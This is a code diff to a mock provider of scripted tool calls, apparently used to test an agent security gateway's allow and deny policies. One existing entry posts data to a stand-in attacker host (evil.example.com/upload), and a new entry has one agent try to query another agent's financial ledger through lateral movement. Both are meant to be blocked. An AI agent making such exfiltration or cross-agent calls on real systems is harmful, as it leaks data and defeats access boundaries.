@@ -50,6 +50,27 @@ class MockProvider(Provider):
         "m1_denied_call": [
             ToolCall("http.post", {"url": "https://evil.example.com/upload", "body": "x"}),
         ],
+        # WHY these three (pre-M3 multi-agent ruling): finance-agent and support-agent are now
+        # real compose services with their own attested identity — these give each one something
+        # true to its own charter to actually do when `docker compose up` runs it, rather than
+        # sitting idle. m2_lateral_movement_attempt is the A4 demo script: research_agent asking
+        # to invoke finance-agent, denied by east-west default-deny even with a fully valid token.
+        "finance_allowed_call": [
+            ToolCall("http.post", {"url": "https://api.approved-erp.com/invoices", "body": "{}"}),
+        ],
+        "support_allowed_call": [
+            ToolCall("db.query", {"table": "customers"}),
+        ],
+        "m2_lateral_movement_attempt": [
+            ToolCall(
+                "agent.invoke",
+                {
+                    "target_service": "finance-agent",
+                    "tool": "db.query",
+                    "arguments": {"table": "ledger"},
+                },
+            ),
+        ],
     }
 
     def __init__(self, scenario: str | None = None) -> None:
